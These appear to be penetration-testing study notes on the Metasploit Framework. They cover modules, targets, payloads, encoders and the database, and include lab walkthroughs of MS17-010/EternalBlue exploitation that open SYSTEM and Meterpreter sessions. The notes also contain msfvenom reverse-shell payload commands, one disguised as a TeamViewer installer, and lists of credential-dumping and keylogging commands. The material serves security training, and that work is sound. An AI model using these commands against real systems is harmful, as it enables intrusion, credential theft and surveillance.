
# 1. Overview & Industry Debate

Recent debates in the cybersecurity community highlight differing views on automated tools:

- **Arguments Against:** Over-reliance on automation prevents analysts from proving manual assessment skills and diminishes professional recognition.
- **Arguments For:** Tools save time on routine tasks, provide a beginner-friendly learning path, and allow assessors to focus on complex vulnerability analysis.

# 2. Risks & Professional Discipline

### 2.1. Potential Pitfalls

- **Comfort Zones & Tunnel Vision:** Restricts focus strictly to what an automated tool can discover.
- **Public Exposure:** Publicly accessible toolsets can be abused by malicious actors.

### 2.2. Professional Best Practices

- **Time Management:** Prioritize high-impact, easily remediable findings over manual checks for every service.
- **Understand Mechanics:** Study tool internals to avoid unstable target behavior or leaving unwanted artifacts.
- **Tool as an Assistant:** Use automation to free up time for deeper manual research and architectural analysis.

# 3. Metasploit Architecture & Directory Structure

Metasploit is an open-source, Ruby-based modular penetration testing platform used to write, test, and execute exploit code.

### 3.1. Core Directories (`/usr/share/metasploit-framework`)

Below are the key paths and useful terminal commands to inspect the framework's internal components:


```bash
# Main directory paths
/usr/share/metasploit-framework/data
/usr/share/metasploit-framework/lib
/usr/share/metasploit-framework/documentation

# List available module categories (auxiliary, exploits, payloads, etc.)
ls /usr/share/metasploit-framework/modules

# List built-in plugins (e.g., nessus, sqlmap, openvas)
ls /usr/share/metasploit-framework/plugins/

# List meterpreter and resource scripts
ls /usr/share/metasploit-framework/scripts/

# List utility tools
ls /usr/share/metasploit-framework/tools/
```

# 4. Metasploit Framework vs. Metasploit Pro

- **Metasploit Framework:** Command-line driven via `msfconsole`, open-source, flexible, and stability-focused.
- **Metasploit Pro:** Commercial version offering a GUI, Quick Start Wizards, automated Task Chains, Social Engineering/Phishing modules, Nexpose integration, and automated reporting.

# 5. Key Terminal & Execution Commands

### 5.1. Updating & Launching `msfconsole`

```bash
# Update Metasploit Framework on Debian-based systems (Parrot / Kali)
sudo apt update && sudo apt install metasploit-framework

# Launch msfconsole with banner
msfconsole

# Launch msfconsole in quiet mode (suppresses startup banner)
msfconsole -q
```

# 6. The Penetration Testing Lifecycle in MSF

1. **Enumeration:** Port scanning and banner grabbing to identify exact service versions.
    
2. **Preparation:** Vulnerability research and module option setup.
    
3. **Exploitation:** Executing the selected module to establish an initial foothold.
    
4. **Privilege Escalation:** Gaining elevated access on the target system.
    
5. **Post-Exploitation:** Gathering evidence, credential dumping, and pivoting.

![image1](<Pasted image 20260809091502.png>)

---

# Metasploit Modules Architecture & Execution Workflow

## Overview

Metasploit Framework (MSF) modules are standardized, pre-tested Ruby scripts designed for specific offensive and reconnaissance tasks. Modules range from vulnerability scanners to functional exploits and post-exploitation extensions.

Automated tools serve to streamline testing workflows, but understanding underlying module configuration, parameter constraints, and target adaptability remains necessary during security assessments.

```
[ Search & Identify Module ] ──> [ Select Module (use) ] ──> [ Configure Parameters (set / setg) ] ──> [ Execute (run / exploit) ] ──> [ Active Session ]
```

## 1. Module Structure & Classification

Metasploit organizes modules using a structured naming convention:

$$\text{Format:} \quad \text{<Index>} \quad \text{<Type>}/\text{<OS>}/\text{<Service>}/\text{<Name>}$$

```
Example: 794  exploit/windows/ftp/scriptftp_list
          │      │       │      │         └─► Specific Vector / Vulnerability Name
          │      │       │      └───────────► Targeted Service or Function
          │      │       └──────────────────► Target Platform Architecture
          │      └──────────────────────────► Primary Module Type
          └─────────────────────────────────► Search Result Index Number
```

### Module Types & Core Functions

|**Module Type**|**Primary Functionality**|**Initiator / Directly Selectable?**|
|---|---|---|
|**`Auxiliary`**|Scanning, network fuzzing, service enumeration, sniffing, and administrative actions.|Yes (`use <module>`)|
|**`Exploits`**|Delivers a payload by leveraging a specific software or protocol vulnerability.|Yes (`use <module>`)|
|**`Post`**|Gathers sensitive artifacts, dumps credentials, and manages pivoting post-exploitation.|Yes (`use <module>`)|
|**`Payloads`**|Code executed on the target to open connections, spawn shells, or execute tasks.|No (Loaded inside an Exploit or standalone)|
|**`Encoders`**|Obfuscates payload bytes to remove bad characters and maintain integrity.|No (Applied to Payloads)|
|**`NOPs`**|Maintains buffer alignment and stability across memory exploit attempts.|No (Applied to Payloads)|
|**`Plugins`**|Extends core `msfconsole` functionality and integrates third-party tools.|No (Loaded via `load <plugin>`)|

## 2. Advanced Module Searching

The `search` command inside `msfconsole` supports targeted filtering using contextual keywords and regular expressions.

```
msf6 > help search
```

### Key Search Filters

|**Keyword**|**Description / Usage**|**Example Syntax**|
|---|---|---|
|`type:`|Filter by module classification|`search type:exploit`|
|`platform:`|Filter by target operating system|`search platform:windows`|
|`cve:`|Search by CVE disclosure year/number|`search cve:2021`|
|`rank:`|Filter by reliability (`excellent`, `great`, `good`, `normal`)|`search rank:excellent`|
|`author:`|Filter by module author|`search author:rapid7`|
|`-<value>`|Exclude a specific keyword or platform|`search cve:2021 platform:-linux`|

### Targeted Search Example

```bash
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

## 3. Practical Workflow: Module Selection & Execution

### Step 1: Initial Discovery

Enumerating open ports reveals SMB listening on `445/tcp` on a legacy Windows target:

```bash
enamto@htb[/htb]$ nmap -sV 10.10.10.40
```

### Step 2: Search & Module Selection

Search for matching vulnerability handlers and load the module via index or full path:

```bash
msf6 > search ms17_010

Matching Modules
================
   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution

msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) >
```

### Step 3: Inspect Details & Configure Options

```bash
# View full module documentation and technical references
msf6 exploit(windows/smb/ms17_010_psexec) > info

# Display configurable variables
msf6 exploit(windows/smb/ms17_010_psexec) > show options
```

#### Parameter Assignment (`set` vs. `setg`)

- `set <Option> <Value>`: Applies configuration only to the currently active module.
    
- `setg <Option> <Value>`: Sets a global variable across all modules within the active MSF session.
    


```bash
# Set global target and local listener IP addresses
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15
```

### Step 4: Run Exploit & Access System Shell

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010!
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158)

meterpreter > shell
C:\Windows\system32> whoami
nt authority\system
```

## 4. Key Takeaways & Operational Notes

- **Exploit Verification:** A failed module execution does not prove a target is invulnerable; timing parameters, firewall inspection, memory offsets, or missing non-default options may require manual adjustment.
    
- **Global Configuration Efficiency:** Using `setg` for `LHOST` and workspace targets reduces repeated data entry across multi-module workflows.
    
- **Payload Flexibility:** Default payloads (e.g., `windows/meterpreter/reverse_tcp`) load automatically, but custom payloads can be explicitly linked via `set PAYLOAD <path>`.

---

# Metasploit Target Specification & Architecture Selection

## Overview

In Metasploit, **Targets** are operating system and service profiles mapped to specific memory layouts, base addresses, Return-Oriented Programming (ROP) gadgets, and instruction pointers (`EIP`/`RIP` offsets).

While modern memory-corruption exploits often include heuristic auto-detection (`Automatic`), reliable exploitation frequently requires setting the explicit target ID matching the target's operating system version, patch level (Service Pack), software build, and system language.

```
[ Active Exploit Module ] ──> [ Query Targets (`show targets`) ] ──> [ Set Target (`set target <ID>`) ] ──> [ Accurate Memory Offsets ]
```

## 1. Inspecting & Selecting Targets

The `show targets` command outputs all memory configurations and operating system versions supported by the loaded exploit module.


```bash
# Executing 'show targets' outside an exploit module yields an error:
msf6 > show targets
[-] No exploit module selected.
```

### Generic vs. Granular Targets

- **Generic/Automatic:** Many network service exploits (e.g., `ms17_010_psexec`) feature a single dynamic target (`0 Automatic`).
    
- **Memory-Specific Targets:** Client-side exploits and memory-corruption vulnerabilities (e.g., Use-After-Free, buffer overflows) require precise memory layouts and DLL offsets.
    

### Practical Example: `ie_execcommand_uaf` (MS12-063)

```bash
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

### Setting the Specific Target

```bash
# Select target index 6 (IE 9 on Windows 7)
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6
target => 6
```

## 2. Technical Determinants of Exploit Targets

Target profiles differ due to how binaries and dynamic link libraries (`DLLs`) load into virtual memory:

```
                      ┌──────────────────────────────────────────────┐
                      │          Target Selection Determinants       │
                      └──────────────────────┬───────────────────────┘
                                             │
         ┌───────────────────────────────────┼───────────────────────────────────┐
         ▼                                   ▼                                   ▼
+-------------------+               +-------------------+               +-------------------+
|  OS & Patch Level |               |   Memory Gadgets  |               |  Language / Pack  |
| Windows 7 SP1 vs  |               | `jmp esp` / ROP   |               | Hardcoded pointer |
| WinXP SP3 offsets |               | chain addresses   |               | shifts in DLLs    |
+-------------------+               +-------------------+               +-------------------+
```

- **Return Addresses:** Pointers such as `jmp esp`, `call eax`, or `pop/pop/ret` sequences must point to static, executable memory segments containing no bad characters.
    
- **DLL Versions:** System DLLs (e.g., `msvcrt.dll`, `ntdll.dll`, `kernel32.dll`) shift across service packs, altering instruction addresses.
    
- **Third-Party Dependencies:** Certain exploits rely on non-ASLR third-party modules (e.g., specific Java Runtime Environment `JRE 1.6.x` versions) to bypass memory mitigations via ROP chains.
    

## 3. Custom Target Identification Workflow

When analyzing custom binaries or non-standard targets:

1. **Extract Binaries:** Retrieve the exact application and operating system executable files (`.exe`, `.dll`) from the target system.
    
2. **Locate Return Addresses:** Use binary inspection tools such as `msfpescan` or debugger plugins (`mona.py`) to discover viable return pointers:
    
```bash
    msfpescan -j esp /path/to/target.dll
```
  
3. **Verify Module Metadata:** Review technical comments and references via `info` to verify prerequisites before launching execution.

---

# Metasploit Payloads: Architecture, Mechanics, & Execution

## Overview

In the Metasploit Framework, a **Payload** is the operational code executed on the target host post-exploitation. While the **Exploit** breaches the vulnerable service, the **Payload** establishes control, typically by spawning an interactive shell, managing network sockets, or loading an in-memory command-and-control agent like **Meterpreter**.

```
+--------------------+        1. Exploit Delivery        +--------------------+
|    Attacker Box    | --------------------------------> |    Target Host     |
| (MSF / Listener)   |                                   | (Vulnerable Serv.) |
|                    |        2. Stage 0 (Stager)        |                    |
|                    | <================================ | Allocates RWX Mem  |
|                    |                                   |                    |
|                    |        3. Stage 1 (Payload)       |                    |
|                    | --------------------------------> | Reflective DLL Inj |
|                    |                                   | (Meterpreter/CLI)  |
| Active Session <---| <================================ | Memory-Resident    |
+--------------------+                                   +--------------------+
```

## 1. Payload Classifications

Metasploit organizes payloads into three functional architectures:

```
                                  ┌──────────────────────────────────────────────┐
                                  │          MSF Payload Classifications         │
                                  └──────────────────────┬───────────────────────┘
                                                         │
         ┌───────────────────────────────────────────────┼───────────────────────────────────────────────┐
         ▼                                               ▼                                               ▼
+--------------------------------+              +--------------------------------+              +--------------------------------+
|       Singles (Inline)         |              |            Stagers             |              |            Stages              |
|  - Completely self-contained   |              |  - Small, reliable bootstrap   |              |  - Large, feature-rich logic   |
|  - One-shot execution          |              |  - Allocates memory on target  |              |  - Meterpreter, VNC, Mimikatz  |
|  - Syntax: `os/arch/payload`   |              |  - Connects & fetches Stage 1  |              |  - Downloaded by Stager        |
+--------------------------------+              +--------------------------------+              +--------------------------------+
```

### Technical Comparison

|**Classification**|**Architecture & Mechanism**|**Naming Convention**|**Primary Pros & Cons**|
|---|---|---|---|
|**Singles (Inline)**|Self-contained binary payload; executes directly without additional network requests.|Identified by an underscore (`_`):<br><br>  <br><br>`windows/x64/shell_reverse_tcp`<br><br>  <br><br>`windows/x64/meterpreter_reverse_tcp`|**Pros:** Stable; no network dependency.<br><br>  <br><br>**Cons:** Larger payload size; may exceed small buffer spaces.|
|**Stagers**|Minimal bootstrap stub that connects back to the handler and prepares target memory (e.g., `VirtualAlloc` with RWX permissions) for the stage.|Identified by slashes (`/`):<br><br>  <br><br>`windows/x64/meterpreter/reverse_tcp`<br><br>  <br><br>`windows/x64/shell/bind_tcp`|**Pros:** Tiny memory footprint; highly reliable.<br><br>  <br><br>**Cons:** Requires multi-stage network transmission.|
|**Stages**|Advanced functional payloads (Meterpreter, VNC injection) pulled and executed in memory by the stager.|Payload component referenced after the slash:<br><br>  <br><br>`.../meterpreter/...`<br><br>  <br><br>`.../vncinject/...`|**Pros:** Unlimited functionality size; memory-resident.<br><br>  <br><br>**Cons:** Requires an established stager connection.|

> **Windows NX vs. NO-NX Stagers:**
> 
> Systems enforcing Data Execution Prevention (DEP) require **NX-compatible stagers** that explicitly call memory allocation APIs (such as `VirtualAlloc`) to mark allocated buffers as executable (`PAGE_EXECUTE_READWRITE`). Modern Metasploit default stagers are NX and Windows 7+ compatible.

## 2. Searching & Filtering Payloads in `msfconsole`

The payload list inside `msfconsole` is extensive. Using `grep` directly within the console accelerates discovery and selection.

```bash
# Filter for 64-bit Windows Meterpreter reverse TCP stagers
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
```

## 3. Practical Payload Configuration & Exploitation

### Step 1: Assign Payload by Index or Path

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
# Alternatively: set payload 15
```

### Step 2: Configure Required Module & Payload Options

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
```

### Step 3: Run Exploit & Catch Multi-Stage Session

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2026-08-19 11:25:32 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## 4. Meterpreter In-Memory Capabilities & Core Commands

**Meterpreter** operates entirely within the target process memory via **Reflective DLL Injection**, leaving no operational binaries on disk.

```
                  ┌──────────────────────────────────────────────┐
                  │          Meterpreter Command Domain          │
                  └──────────────────────┬───────────────────────┘
                                         │
         ┌───────────────────┬───────────┴───────────┬───────────────────┐
         ▼                   ▼                       ▼                   ▼
+-----------------+ +-----------------+     +-----------------+ +-----------------+
|   System / Priv | |   Networking    |     |   File System   | |  Post / Espion  |
| getuid, getsid  | | ipconfig, route |     | download, upload| | keyscan_start  |
| getprivs, ps    | | portfwd, arp    |     | ls, cd, rm, pwd | | screenshot, reg |
+-----------------+ +-----------------+     +-----------------+ +-----------------+
```

### High-Value Meterpreter Commands

|**Category**|**Command**|**Operational Description**|
|---|---|---|
|**Privilege / Identity**|`getuid`|Retrieves the active username/SID context (`NT AUTHORITY\SYSTEM`).|
|**Credential Access**|`hashdump`|Extracts local SAM database password hashes directly from registry memory.|
|**Process Control**|`migrate <PID>`|Injects and migrates Meterpreter into a more stable system process (e.g., `explorer.exe` or `lsass.exe`).|
|**Network Pivoting**|`portfwd add ...`|Forwards local attacker ports to internal subnets via the compromised host.|
|**Surveillance**|`keyscan_start` / `keyscan_dump`|Captures and dumps user keystrokes in real time.|
|**System Dropping**|`shell`|Opens a native command interpreter channel (`cmd.exe` or `/bin/bash`).|

## 5. Common Windows Payloads Matrix

|**Payload Identifier**|**Architecture**|**Delivery Model**|**Description**|
|---|---|---|---|
|`windows/x64/shell_reverse_tcp`|x64|**Single (Inline)**|Standard un-staged reverse command shell.|
|`windows/x64/shell/reverse_tcp`|x64|**Staged**|Two-stage reverse command prompt.|
|`windows/x64/meterpreter_reverse_tcp`|x64|**Single (Inline)**|Self-contained, single-binary Meterpreter reverse shell.|
|`windows/x64/meterpreter/reverse_tcp`|x64|**Staged**|Staged in-memory Reflective DLL Meterpreter session.|
|`windows/x64/meterpreter/reverse_https`|x64|**Staged (Encrypted)**|Meters communication over TLS/HTTPS (bypasses basic DPI firewalls).|
|`windows/x64/powershell_reverse_tcp`|x64|**Single (Inline)**|Interactive PowerShell execution session.|
|`windows/x64/vncinject/reverse_tcp`|x64|**Staged**|Reflective VNC DLL injection granting GUI remote desktop access.|

---

# Metasploit Encoders, Bad Characters, & AV Evasion Realities

## Overview

In the Metasploit Framework, **Encoders** modify payload shellcode to eliminate restricted bytes (**bad characters**) that break exploit buffer execution, while adapting payloads across processor architectures (`x86`, `x64`, `sparc`, `ppc`, `mips`).

Historically, polymorphic encoders like **`x86/shikata_ga_nai`** (SGN) were heavily leveraged to bypass signature-based Antivirus (AV) solutions. In modern offensive security, static signatures, heuristic scanners, and EDR behavioral analysis easily detect standard Metasploit encoder stubs.

```
[ Raw Shellcode ] ──> [ Encoder (-e) / Bad Char Filter (-b) ] ──> [ Decoder Stub + Encoded Payload ]
```

## 1. Primary Functions of Encoders

```
                                  ┌──────────────────────────────────────────────┐
                                  │          Core Purposes of Encoders           │
                                  └──────────────────────┬───────────────────────┘
                                                         │
         ┌───────────────────────────────────────────────┼───────────────────────────────────────────────┐
         ▼                                               ▼                                               ▼
+--------------------------------+              +--------------------------------+              +--------------------------------+
|     Bad Character Removal      |              |   Architecture Compatibility   |              |   Format & Packaging Bounds    |
| Strips `\x00` (null bytes),    |              | Translates shellcode to match  |              | Formats payloads for Perl, C,  |
| CR/LF (`\x0d`, `\x0a`), etc.   |              | x86, x64, MIPS, or SPARC.      |              | Python, Raw, or EXE execution. |
+--------------------------------+              +--------------------------------+              +--------------------------------+
```

### Why Bad Characters Matter

During memory corruption (such as stack buffer overflows or string formatting flaws), the target application interprets specific bytes as terminators:

- `\x00` (Null Byte): Terminates C-style strings, truncating shellcode injection.
    
- `\x0a` / `\x0d` (Newline / Carriage Return): Terminates network protocol commands (HTTP, FTP, SMTP).
    
- Specifying `-b "\x00\x0a\x0d"` forces `msfvenom` to route through compatible encoders that substitute these opcodes.
    

## 2. Legacy vs. Modern Workflow

- **Legacy Tooling (Pre-2015):** Generation and encoding were separated into standalone binaries (`msfpayload` piped into `msfencode`).
    
- **Modern Tooling (`msfvenom`):** Combines generation, formatting, and iterative encoding into a unified CLI binary.
    

```bash
# Modern Single-Command Syntax
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -b "\x00" -e x86/shikata_ga_nai -f perl
```

## 3. The Myth of AV Evasion with Shikata Ga Nai

**Shikata Ga Nai (SGN - 仕方がない)** is a polymorphic XOR additive feedback encoder. While it dynamically varies instruction ordering and decoder registers on each generation, the **decoder stub itself** has a well-known signature cataloged by every major AV and EDR vendor.

### Multi-Iteration Myth (`-i 10`)

Increasing iteration rounds (e.g., `-i 10`) wraps the payload inside multiple layers of decoder stubs. While this alters the hash and internal shellcode pattern, it does **not** bypass modern defenses.

```bash
# Generating an executable with 10 encoding iterations
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 \
  -e x86/shikata_ga_nai -i 10 \
  -f exe -o TeamViewerInstall.exe
```

### VirusTotal Analysis Output (`msf-virustotal`)

Submitting standard encoded MSF binaries to multi-engine scanners demonstrates near-universal detection:

```bash
enamto@htb[/htb]$ msf-virustotal -k <API_KEY> -f TeamViewerInstall.exe

[*] Analysis Report: TeamViewerInstall.exe (51 / 68 Engines Flagged Malicious)
=============================================================================
 Antivirus          Detected   Result
 ---------          --------   ------
 Microsoft          true       Trojan:Win32/Meterpreter.A
 CrowdStrike        true       win/malicious_confidence_100%
 Kaspersky          true       HEUR:Trojan.Win32.Generic
 SentinelOne        true       Static AI - Malicious PE
 Sophos             true       ML/PE-A + Mal/EncPk-ACE
```

## 4. Querying & Selecting Compatible Encoders

Inside `msfconsole`, running `show encoders` while inside an exploit module filters encoders compatible with the selected target architecture.

```bash
# Display compatible 64-bit encoders
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================
   #  Name              Rank    Description
   -  ----              ----    -----------
   0  generic/eicar     manual  The EICAR Encoder
   1  generic/none      manual  The "none" Encoder
   2  x64/xor           manual  XOR Encoder
   3  x64/xor_dynamic   manual  Dynamic key XOR Encoder
   4  x64/zutto_dekiru  manual  Zutto Dekiru
```

### Common Encoders Reference

|**Encoder Name**|**Architecture**|**Rank**|**Mechanism / Notes**|
|---|---|---|---|
|`x86/shikata_ga_nai`|x86 (32-bit)|Excellent|Polymorphic XOR additive feedback.|
|`x86/alpha_mixed`|x86 (32-bit)|Low|Alphanumeric mixed-case printable ASCII encoder.|
|`x64/zutto_dekiru`|x64 (64-bit)|Manual|Dynamic block-based polymorphic 64-bit XOR encoder.|
|`generic/none`|Multi|Normal|Skips encoding; outputs raw shellcode untouched.|

---

# Metasploit Database Management & Assessment Tracking

## Overview

During complex multi-host network engagements, tracking discovered services, open ports, identified vulnerabilities, dumped credentials, and loot manually creates operational friction. Metasploit integrates natively with a **PostgreSQL** backend to centralize, structure, and automate target data management.

Connecting `msfconsole` to PostgreSQL enables data import/export, integrated scanning via `db_nmap`, segmented project tracking using **Workspaces**, and automatic population of module parameters (such as `RHOSTS`).

```
                                  ┌──────────────────────────────────────────────┐
                                  │             PostgreSQL Service               │
                                  └──────────────────────┬───────────────────────┘
                                                         │
                                    msfdb init / msfdb run / db_connect
                                                         │
                                                         ▼
                                  ┌──────────────────────────────────────────────┐
                                  │                  msfconsole                  │
                                  └──────────────────────┬───────────────────────┘
                                                         │
         ┌───────────────────┬───────────────────────────┼───────────────────────────┬───────────────────┐
         ▼                   ▼                           ▼                           ▼                   ▼
+-----------------+ +-----------------+         +-----------------+         +-----------------+ +-----------------+
|   Workspaces    | |   db_nmap /     |         |     Hosts &     |         |  Credentials &  | |   Data Export   |
| (Project scope) | |   db_import     |         |    Services     |         |      Loot       | |   (db_export)   |
+-----------------+ +-----------------+         +-----------------+         +-----------------+ +-----------------+
```

## 1. Database Initialization & Setup

To establish the backend connection, ensure the PostgreSQL service is active and initialize the Metasploit database schema:

```bash
# 1. Start PostgreSQL Service
sudo systemctl start postgresql

# 2. Initialize MSF Database
sudo msfdb init

# 3. Launch MSF with database auto-connection
sudo msfdb run
```

### Database Troubleshooting & Re-initialization

If configuration mismatches or authentication errors occur:

```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

### Verifying Database Connection

Inside `msfconsole`:

```bash
msf6 > db_status
[*] Connected to msf. Connection type: PostgreSQL.
```

## 2. Segmenting Assessments with Workspaces

**Workspaces** isolate targets, scan logs, and looted artifacts by engagement scope, subnet, or client environment—preventing cross-contamination.

```bash
# List available workspaces (* denotes active workspace)
msf6 > workspace

# Create a new workspace
msf6 > workspace -a Target_Network_1

# Switch active workspace
msf6 > workspace Target_Network_1

# Delete a workspace
msf6 > workspace -d Target_Network_1
```

## 3. Ingesting & Managing Scan Data

### Importing External Scans (`db_import`)

Import Nmap XML outputs or vulnerability scanner files directly into the active database workspace:

```bash
msf6 > db_import Target.xml
[*] Importing 'Nmap XML' data
[*] Successfully imported Target.xml
```

### Native In-Console Scanning (`db_nmap`)

Run Nmap scans directly from `msfconsole` without backgrounding sessions; results automatically populate database tables:

```bash
msf6 > db_nmap -sV -sS 10.10.10.8
```

## 4. Querying & Manipulating Stored Assessment Data

Once data is imported, query structured tables using dedicated database backend commands:

```
[ Hosts Table (hosts) ] ──> [ Services Table (services) ] ──> [ Credentials (creds) ] ──> [ Loot (loot) ]
```

### Database Query Commands Matrix

|**Command**|**Primary Function**|**Key Filtering Flags**|**Operational Example**|
|---|---|---|---|
|**`hosts`**|Displays identified target IPs, OS signatures, and hostnames.|`-u` (Up hosts only)<br><br>  <br><br>`-R` (Set `RHOSTS` automatically)<br><br>  <br><br>`-S` (Search keyword)|`hosts -u -R`<br><br>  <br><br>_(Pipes all active hosts directly to active module's `RHOSTS`)_|
|**`services`**|Lists discovered network ports, protocols, and daemon versions.|`-p` (Filter ports)<br><br>  <br><br>`-s` (Filter service name)<br><br>  <br><br>`-u` (Up services)|`services -p 445 --rhosts`<br><br>  <br><br>_(Sets `RHOSTS` to all hosts with SMB open)_|
|**`creds`**|Manages plaintext passwords, NTLM hashes, and SSH keys.|`-t` (Filter type: password/ntlm/hash)<br><br>  <br><br>`-s` (Filter service)<br><br>  <br><br>`-o` (Export to CSV/JtR/Hashcat)|`creds -s smb -o hashes.jtr`<br><br>  <br><br>_(Exports SMB credentials in JtR-ready format)_|
|**`loot`**|Tracks dumped hashes (`/etc/shadow`, SAM), configs, and exfiltrated files.|`-t` (Filter loot type)<br><br>  <br><br>`-d` (Delete loot entry)|`loot -t hashdump`|

### Adding Credentials Manually

```bash
# Add NTLM hash
msf6 > creds add user:Administrator ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A realm:CORP

# Add SSH Private Key
msf6 > creds add user:root ssh-key:/root/.ssh/id_rsa
```

## 5. Assessment Backup & Data Export

Before concluding an engagement or resetting the host environment, export all findings into portable XML or credential dumps:

```bash
# Export active workspace to XML
msf6 > db_export -f xml /root/engagement_backup.xml

# Export password hashes for offline cracking
msf6 > db_export -f pwdump /root/cracking_hashes.txt
```
